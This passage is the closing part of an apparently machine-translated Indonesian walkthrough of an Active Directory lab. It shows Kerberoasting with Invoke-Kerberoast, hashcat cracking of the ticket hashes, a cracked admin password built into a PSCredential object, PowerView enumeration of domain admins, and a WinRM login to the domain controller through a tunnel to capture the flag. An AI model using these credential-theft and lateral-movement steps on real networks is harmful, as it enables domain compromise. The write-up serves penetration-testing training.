<img src="https://habrastorage.org/webt/4w/7n/0e/4w7n0etds8_qa2gdphtohdzyibi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan mari kita ambil hash.</font></font><br>
<br>
<pre><code class="powershell hljs">. .\<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1
<span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-erroraction</span> silentlycontinue <span class="hljs-literal">-OutputFormat</span> Hashcat | <span class="hljs-built_in">Select-Object</span> Hash | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-filepath</span> <span class="hljs-string">'C:\temp\kerb_hashes.txt'</span> <span class="hljs-literal">-Width</span> <span class="hljs-number">8000</span>
<span class="hljs-built_in">type</span> kerb_hashes.txt</code></pre><br>
<img src="https://habrastorage.org/webt/yx/1w/u9/yx1wu93j1to_zllmxgnhcos-afi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selanjutnya Anda perlu memilah-milah hash ini. Karena tidak ada data kata sandi dalam kamus rockyou, saya menggunakan SEMUA kamus kata sandi yang disediakan oleh Seclists. Untuk pencarian kami menggunakan hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -a 0 -m 13100 krb_hashes.txt /usr/share/seclists/Passwords/*.txt --force</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami menemukan kedua kata sandi, yang pertama di kamus dutch_passwordlist.txt, dan yang kedua di Keyboard-Combinations.txt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0b/5y/wf/0b5ywfghlgdiz2j9qhs31omv5cu.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/j4/tb/zn/j4tbznqjl3gr9fcuu9xlyedgpq0.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami memiliki tiga pengguna, buka pengontrol domain. Pertama kita cari tahu alamatnya. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ky/ch/jv/kychjvk-alnhztcgb9ke1elcbr8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Oke, kami menemukan alamat IP pengendali domain. Mari cari tahu semua pengguna domain, dan siapa di antara mereka yang merupakan administrator. Untuk mengunduh skrip untuk mendapatkan informasi PowerView.ps1. Kemudian hubungkan menggunakan evil-winrm dengan menentukan direktori dengan skrip pada parameter -s. Dan kemudian hanya memuat skrip PowerView. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/in/pj/g6/inpjg6yjboxjl2mmm-idf7bxnby.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang semua fungsinya tersedia untuk kita. Pengguna p00_adm terlihat seperti pengguna istimewa, jadi kami akan bekerja dalam konteksnya. Buat objek PSCredential untuk pengguna ini.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-variable">$User</span> = <span class="hljs-string">'p00_adm'</span>
<span class="hljs-variable">$Password</span> = <span class="hljs-string">'ZQ!5t4r'</span>
<span class="hljs-variable">$Cpass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-variable">$Password</span> <span class="hljs-literal">-force</span>
<span class="hljs-variable">$Creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Cpass</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang semua perintah Powershell, tempat kami menentukan Kredit, akan dieksekusi atas nama p00_adm. </font><font style="vertical-align: inherit;">Mari daftar pengguna dan atribut AdminCount.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-DomainController</span> dc <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Creds</span> | <span class="hljs-built_in">select</span> name,admincount</code></pre><br>
<img src="https://habrastorage.org/webt/ls/f-/dj/lsf-djkkzvds5ldjc5dpxzxldzi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi, pengguna kami benar-benar istimewa. </font><font style="vertical-align: inherit;">Mari kita lihat pada kelompok-kelompok di mana ia disusun.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Get-NetGroup</span> <span class="hljs-literal">-UserName</span> <span class="hljs-string">"p00_adm"</span> <span class="hljs-literal">-DomainController</span> dc <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Creds</span></code></pre><br>
<img src="https://habrastorage.org/webt/0i/da/v3/0idav3lcaomgr7tilfhcjaw249q.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami menegaskan bahwa pengguna adalah administrator domain. Ini memberinya hak untuk login jarak jauh ke pengontrol domain. Mari kita coba masuk melalui WinRM menggunakan terowongan kami. Saya bingung dengan kesalahan yang dihasilkan oleh reGeorg saat menggunakan evil-winrm. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xj/ux/yl/xjuxyl8tpyd1bobnbyta3tiiayy.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kemudian kita akan menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">skrip</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> lain yang lebih mudah </font><font style="vertical-align: inherit;">untuk terhubung ke WinRM. Buka dan ubah parameter untuk koneksi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/82/kb/je/82kbjeugczagin5d1v1h2xo9_0m.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami mencoba terhubung, dan kami berada di sistem. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v6/gs/yl/v6gsyl1rnhmxn8etxybln4qvwcc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tapi tidak ada bendera. Kemudian lihat pengguna dan periksa desktop. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o3/qq/ym/o3qqymhx-ntmpd0audycjka07fo.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di mr3ks kami menemukan benderanya dan laboratorium dilewati 100%. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sl/m7/fj/slm7fj0mnm5r4beu96duwg7ogjo.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Itu saja. Sebagai umpan balik, komentari apakah Anda mempelajari sesuatu yang baru dari artikel ini dan apakah itu bermanfaat bagi Anda. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat bergabung dengan kami di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Di sana Anda dapat menemukan materi yang menarik, kursus yang digabungkan, serta perangkat lunak. </font><font style="vertical-align: inherit;">Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id504890/index.html">Kembali nilai dari powershell invoke-command ke SQL-Server Agent</a></li>
<li><a href="../id504894/index.html">GUI dalam bahasa Rusia, atau terminal VKS melakukannya sendiri</a></li>
<li><a href="../id504902/index.html">9 Tren Teratas dalam Pengujian Otomatis pada tahun 2020</a></li>
<li><a href="../id504906/index.html">PHP - apa niche bahasa dan akankah PHP8 membantu memecahkan masalah yang mendesak (spoiler: IMHO tidak)</a></li>
<li><a href="../id504908/index.html">PyTrace - Debugger Perjalanan Waktu untuk Python</a></li>
<li><a href="../id504918/index.html">Layanan pelajaran online paling efektif untuk siswa dan guru: lima besar</a></li>
<li><a href="../id504924/index.html">Bagaimana memahami bahwa suatu proyek adalah proyek dan menjalankannya dengan benar</a></li>
<li><a href="../id504926/index.html">Cara memilih alat otomatisasi terbaik untuk pekerjaan Anda di Revit. Desainer vs programmer</a></li>
<li><a href="../id504936/index.html">TechTrain 2020: "festival on the fly" gratis</a></li>
<li><a href="../id504938/index.html">Bu, aku streamer sekarang</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>